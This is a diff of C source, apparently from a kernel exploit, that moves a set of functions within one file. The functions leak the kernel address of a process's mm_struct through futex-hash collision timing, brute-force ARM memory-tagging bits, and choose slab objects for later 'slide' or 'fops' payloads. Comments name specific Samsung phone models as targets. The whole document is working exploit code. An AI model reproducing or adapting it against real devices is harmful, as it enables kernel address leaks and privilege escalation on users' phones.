@@ -5,6 +5,163 @@ static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
+#if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
+static uintptr_t smart_mm_match_page(
+    const struct kernelsnitch_shared_state *state, uintptr_t base) {
+  const size_t objects_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  uintptr_t found = (uintptr_t)-1;
+  size_t matches = 0;
+
+  for (size_t index = 0; index < objects_per_slab; ++index) {
+    uintptr_t candidate = base + index * MM_STRUCT_SZ;
+    uintptr_t matched_tagged = (uintptr_t)-1;
+    int matched = 0;
+
+#if defined(KERNELSNITCH_MTE_ENABLED) && KERNELSNITCH_MTE_ENABLED
+    for (size_t tag = 0; tag < 16 && !matched; ++tag) {
+      uintptr_t tagged = candidate & ~(0xfULL << 56);
+      tagged |= tag << 56;
+      size_t hash = futex_hash(state->futex_addrs[0], tagged);
+      int equal = 1;
+      for (size_t i = 1; i < state->collisions && equal; ++i) {
+        equal = hash == futex_hash(state->futex_addrs[i], tagged);
+      }
+      if (equal) {
+        matched = 1;
+        matched_tagged = tagged;
+      }
+    }
+#else
+    size_t hash = futex_hash(state->futex_addrs[0], candidate);
+    matched = 1;
+    for (size_t i = 1; i < state->collisions && matched; ++i) {
+      matched = hash == futex_hash(state->futex_addrs[i], candidate);
+    }
+    if (matched) {
+      matched_tagged = candidate;
+    }
+#endif
+
+    if (matched) {
+      found = matched_tagged;
+      matches++;
+      if (matches > 1) {
+        return (uintptr_t)-1;
+      }
+    }
+  }
+
+  return matches == 1 ? found : (uintptr_t)-1;
+}
+
+/*
+ * A53-style discovery for S24 FE:
+ * first obtain an mm_struct with the full collision set, derive its slab,
+ * then confirm that exact slab with a two-collision hint pass. The original
+ * full-search result remains the fallback if the hint confirmation misses.
+ */
+static int smart_mm_leak_once(size_t cpu_count, uintptr_t hint,
+                              uintptr_t *mm_out, int *hint_hit) {
+  const size_t collisions =
+      hint ? APP_SMART_MM_HINT_COLLISIONS : APP_SMART_MM_FULL_COLLISIONS;
+  int child;
+  int fd;
+  int status;
+
+  *hint_hit = 0;
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+  if (!ks) {
+    return -1;
+  }
+
+  kernelsnitch_set_profile(
+      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+      SLIDE_KSNITCH_AVERAGE);
+
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  kernelsnitch_set_search_bounds(
+      ks, KERNELSNITCH_IDENTITY_START,
+      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      0, (ORDER3_SIZE / MM_STRUCT_SZ) - 1,
+      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
+#endif
+
+  child = clone_leak_child();
+  fd = open_memfd(child);
+  if (waitpid(child, &status, 0) != child ||
+      !WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
+      !kernelsnitch_found_collisions(ks)) {
+    close(fd);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    return -2;
+  }
+
+  if (hint) {
+    uintptr_t canonical_hint = hint & ~(ORDER3_SIZE - 1);
+    ks->mm_struct = smart_mm_match_page(ks, canonical_hint);
+    if (ks->mm_struct == (uintptr_t)-1) {
+      close(fd);
+      kernelsnitch_cleanup(ks);
+      ks = NULL;
+      return -2;
+    }
+    ks->found = 1;
+    ks->state = KERNELSNITCH_MM_FOUND;
+    *hint_hit = 1;
+  } else {
+    kernelsnitch_bruteforce(ks);
+  }
+
+  if (ks->mm_struct == (uintptr_t)-1) {
+    close(fd);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    return -2;
+  }
+
+  *mm_out = ks->mm_struct;
+  return fd;
+}
+
+static uintptr_t smart_mm_canonicalize(uintptr_t mm) {
+  if (mm == (uintptr_t)-1) {
+    return mm;
+  }
+#if defined(KERNELSNITCH_MTE_ENABLED) && KERNELSNITCH_MTE_ENABLED
+  mm |= 0xff00000000000000ULL;
+#endif
+  return mm;
+}
+
+static int smart_mm_object_allowed(uintptr_t mm, int payload_mode) {
+  uintptr_t canonical = smart_mm_canonicalize(mm);
+  uintptr_t base = canonical & ~(ORDER3_SIZE - 1);
+  size_t index = (canonical - base) / MM_STRUCT_SZ;
+
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+#if defined(APP_SLIDE_MIN_OBJECT_INDEX) && defined(APP_SLIDE_MAX_OBJECT_INDEX)
+    return index >= APP_SLIDE_MIN_OBJECT_INDEX &&
+           index <= APP_SLIDE_MAX_OBJECT_INDEX;
+#else
+    return 1;
+#endif
+  }
+
+#if defined(APP_FOPS_MIN_OBJECT_INDEX)
+  return index >= APP_FOPS_MIN_OBJECT_INDEX &&
+         index < (ORDER3_SIZE / MM_STRUCT_SZ);
+#else
+  return 1;
+#endif
+}
+#endif
+
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
 static int controlled_reclaim_sv[S918_RECLAIM_SOCKET_PAIRS - 1][2];
@@ -938,162 +1095,6 @@ static int controlled_mm_valid(uintptr_t mm) {
          offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
 }
 
-#if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
-static uintptr_t smart_mm_match_page(
-    const struct kernelsnitch_shared_state *state, uintptr_t base) {
-  const size_t objects_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-  uintptr_t found = (uintptr_t)-1;
-  size_t matches = 0;
-
-  for (size_t index = 0; index < objects_per_slab; ++index) {
-    uintptr_t candidate = base + index * MM_STRUCT_SZ;
-    uintptr_t matched_tagged = (uintptr_t)-1;
-    int matched = 0;
-
-#if defined(KERNELSNITCH_MTE_ENABLED) && KERNELSNITCH_MTE_ENABLED
-    for (size_t tag = 0; tag < 16 && !matched; ++tag) {
-      uintptr_t tagged = candidate & ~(0xfULL << 56);
-      tagged |= tag << 56;
-      size_t hash = futex_hash(state->futex_addrs[0], tagged);
-      int equal = 1;
-      for (size_t i = 1; i < state->collisions && equal; ++i) {
-        equal = hash == futex_hash(state->futex_addrs[i], tagged);
-      }
-      if (equal) {
-        matched = 1;
-        matched_tagged = tagged;
-      }
-    }
-#else
-    size_t hash = futex_hash(state->futex_addrs[0], candidate);
-    matched = 1;
-    for (size_t i = 1; i < state->collisions && matched; ++i) {
-      matched = hash == futex_hash(state->futex_addrs[i], candidate);
-    }
-    if (matched) {
-      matched_tagged = candidate;
-    }
-#endif
-
-    if (matched) {
-      found = matched_tagged;
-      matches++;
-      if (matches > 1) {
-        return (uintptr_t)-1;
-      }
-    }
-  }
-
-  return matches == 1 ? found : (uintptr_t)-1;
-}
-
-/*
- * A53-style discovery for S24 FE:
- * first obtain an mm_struct with the full collision set, derive its slab,
- * then confirm that exact slab with a two-collision hint pass. The original
- * full-search result remains the fallback if the hint confirmation misses.
- */
-static int smart_mm_leak_once(size_t cpu_count, uintptr_t hint,
-                              uintptr_t *mm_out, int *hint_hit) {
-  const size_t collisions =
-      hint ? APP_SMART_MM_HINT_COLLISIONS : APP_SMART_MM_FULL_COLLISIONS;
-  int child;
-  int fd;
-  int status;
-
-  *hint_hit = 0;
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions,
-      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
-  if (!ks) {
-    return -1;
-  }
-
-  kernelsnitch_set_profile(
-      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-      SLIDE_KSNITCH_AVERAGE);
-
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
-    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
-    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
-  kernelsnitch_set_search_bounds(
-      ks, KERNELSNITCH_IDENTITY_START,
-      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
-      0, (ORDER3_SIZE / MM_STRUCT_SZ) - 1,
-      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
-#endif
-
-  child = clone_leak_child();
-  fd = open_memfd(child);
-  if (waitpid(child, &status, 0) != child ||
-      !WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
-      !kernelsnitch_found_collisions(ks)) {
-    close(fd);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    return -2;
-  }
-
-  if (hint) {
-    uintptr_t canonical_hint = hint & ~(ORDER3_SIZE - 1);
-    ks->mm_struct = smart_mm_match_page(ks, canonical_hint);
-    if (ks->mm_struct == (uintptr_t)-1) {
-      close(fd);
-      kernelsnitch_cleanup(ks);
-      ks = NULL;
-      return -2;
-    }
-    ks->found = 1;
-    ks->state = KERNELSNITCH_MM_FOUND;
-    *hint_hit = 1;
-  } else {
-    kernelsnitch_bruteforce(ks);
-  }
-
-  if (ks->mm_struct == (uintptr_t)-1) {
-    close(fd);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    return -2;
-  }
-
-  *mm_out = ks->mm_struct;
-  return fd;
-}
-
-static uintptr_t smart_mm_canonicalize(uintptr_t mm) {
-  if (mm == (uintptr_t)-1) {
-    return mm;
-  }
-#if defined(KERNELSNITCH_MTE_ENABLED) && KERNELSNITCH_MTE_ENABLED
-  mm |= 0xff00000000000000ULL;
-#endif
-  return mm;
-}
-
-static int smart_mm_object_allowed(uintptr_t mm, int payload_mode) {
-  uintptr_t canonical = smart_mm_canonicalize(mm);
-  uintptr_t base = canonical & ~(ORDER3_SIZE - 1);
-  size_t index = (canonical - base) / MM_STRUCT_SZ;
-
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-#if defined(APP_SLIDE_MIN_OBJECT_INDEX) && defined(APP_SLIDE_MAX_OBJECT_INDEX)
-    return index >= APP_SLIDE_MIN_OBJECT_INDEX &&
-           index <= APP_SLIDE_MAX_OBJECT_INDEX;
-#else
-    return 1;
-#endif
-  }
-
-#if defined(APP_FOPS_MIN_OBJECT_INDEX)
-  return index >= APP_FOPS_MIN_OBJECT_INDEX &&
-         index < (ORDER3_SIZE / MM_STRUCT_SZ);
-#else
-  return 1;
-#endif
-}
-#endif
 
 static uintptr_t controlled_mm_match_page(
     const struct kernelsnitch_shared_state *state, uintptr_t base) {
